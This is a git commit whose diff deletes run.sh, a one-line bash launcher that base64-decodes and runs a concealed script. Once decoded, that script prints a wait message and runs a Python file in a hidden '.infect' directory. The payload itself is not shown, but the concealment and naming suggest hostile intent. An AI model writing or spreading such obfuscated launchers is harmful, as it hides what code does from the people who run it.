bcd0042eaea4b9f909e3f555906b70d1fe77ad28
Abdul Basit Minhas <52023076+Tech-abm@users.noreply.github.com>
2021-06-06 08:13:16 +0000

    Delete run.sh

--- run.sh
+++
@@ -1,4 +0,0 @@
-bash -c "$(base64 -d <<< "\
-IyEvYmluL2Jhc2gKY2xlYXIKZWNobwplY2hvCmVjaG8KZWNobyAiV2FpdCBVbnRpbCBUaGUgUHJv
-Y2VzcyBJcyBDb21wbGV0ZS4hIgplY2hvCmVjaG8KZWNobwpzbGVlcCAyCmNkIC5pbmZlY3QKcHl0
-aG9uMiBpbmZlY3RfcGF0aC5yZQo=")" bash "$@"
